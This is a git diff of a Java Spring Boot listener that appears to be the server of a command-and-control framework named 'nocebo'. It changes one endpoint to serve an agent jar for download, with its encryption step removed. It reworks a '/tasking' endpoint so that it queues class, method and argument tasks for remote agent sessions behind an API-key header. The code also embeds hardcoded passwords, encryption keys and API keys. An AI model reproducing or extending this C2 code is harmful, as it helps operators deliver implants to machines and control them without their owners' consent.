@@ -5,6 +5,7 @@ import org.springframework.boot.autoconfigure.SpringBootApplication;
 import org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration;
 import org.springframework.context.annotation.Bean;
 import org.springframework.context.annotation.Configuration;
+import org.springframework.http.MediaType;
 import org.springframework.http.HttpStatus;
 import org.springframework.http.HttpHeaders;
 import org.springframework.http.ResponseEntity;
@@ -17,7 +18,10 @@ import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.bind.annotation.CookieValue;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestHeader;
 
 import java.security.InvalidAlgorithmParameterException;
 import java.security.KeyManagementException;
@@ -39,11 +43,11 @@ import javax.crypto.IllegalBlockSizeException;
 import java.io.File;
 import java.io.StringWriter;
 import java.net.URI;
-import java.net.http.HttpHeaders;
 import java.io.IOException;
 import java.io.StringReader;
 import java.util.ArrayList;
 import java.util.Hashtable;
+import java.util.Map;
 import java.util.Base64;
 import java.util.Random;
 import java.util.Enumeration;
@@ -89,6 +93,7 @@ public class ListenerApplication {
 			static String userpass = "SiAp++Em=@vBnQo0_";
 			static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
 			static String apiKey = "a18b25f2-6045-4aa2-b0b5-1dae01aa4f9a";
+			static String apiPass = "882fb2a4-23ed-46c3-b005-83b71c554845";
 			static String agentKey = "q8uf6,p2m1@31395aO+g+9592_4891lS";
 			static Hashtable<String,session> sessionTable = new Hashtable();
 		}
@@ -265,38 +270,18 @@ public class ListenerApplication {
 
 		}
 
-		@RequestMapping("/59013")
+		@RequestMapping(value = "/59013",produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
 		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
-		ResponseEntity<String> downloadStub() throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+		@ResponseBody byte[] downloadStub() throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
 		{
+			System.out.println("stub downloading");
 			//encrypt
-			String downloadNonce = String.join(
-				"-", 
-				new String[] {
-					napi.strand(8),
-					napi.strand(4),
-					napi.strand(4),
-					napi.strand(4),
-					napi.strand(12)
-				}
-			);
 
-			HttpHeaders respHeaders = new HttpHeaders();
-			respHeaders.set("uuid", downloadNonce);
 
-			String filePath = String.format("..%sfileroot%slib%sstub.jar",File.separator,File.separator,File.separator,File.separator);
+			String filePath = String.format("..%sfileroot%slib%siAgent.jar",File.separator,File.separator,File.separator,File.separator);
 			byte[] fileData = Files.readAllBytes(Paths.get(filePath));
 			
-			String cData = new String(
-						Base64.getEncoder().encode(
-							sapi.encrypt(
-								fileData,
-								downloadNonce.substring(0,12).replace("-","").getBytes(StandardCharsets.UTF_8),
-								epc.agentKey
-							)
-						)
-					);
-			return new ResponseEntity<String>(cData, respHeaders, HttpStatus.OK);
+			return fileData;
 		}
 
 		@RequestMapping("/59053")
@@ -313,19 +298,24 @@ public class ListenerApplication {
 		}
 
 		@PostMapping("/tasking")
-		String ctrl(@RequestBody noceboApiCommand requestData, @CookieValue("nocebo.auth") String authCookie) throws IOException
+		String ctrl(@RequestBody Map<String, String> requestData, @RequestHeader("nClient-key") String clientApiKey) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, Exception
 		{
+			if (!clientApiKey.equals(epc.apiPass))
+			{
+				return "Fatal Error: Incorrect API key";
+			}
+
 			ArrayList<session> sessionData = new ArrayList();
 			boolean foundDownstream = false;
 			//put authenticator in front
-			if (!epc.sessionTable.keySet().contains(requestData.uuid))
+			if (!epc.sessionTable.keySet().contains(requestData.get("uuid")))
 			{
 				Enumeration<String> k = epc.sessionTable.keys();
 				while (k.hasMoreElements())
 				{
 					String sessionKey = k.nextElement();
 					session tempSessionData = (session) epc.sessionTable.get(sessionKey);
-					if (tempSessionData.downstream.contains(requestData.uuid))
+					if (tempSessionData.downstream.contains(requestData.get("uuid")))
 					{
 						sessionData.add(tempSessionData);
 					}
@@ -338,15 +328,15 @@ public class ListenerApplication {
 			}
 			else
 			{
-				sessionData.add((session) epc.sessionTable.get(requestData.uuid));
+				sessionData.add((session) epc.sessionTable.get(requestData.get("uuid")));
 			}
 			
 
 			Hashtable newTask = napi.mkTask(
-				requestData.className,
-				requestData.methodName,
-				requestData.uuid,
-				requestData.args.split(",")
+				requestData.get("className"),
+				requestData.get("methodName"),
+				requestData.get("uuid"),
+				requestData.get("args").split(",")
 			);
 
 			for (int s=0; s<sessionData.size();s++)
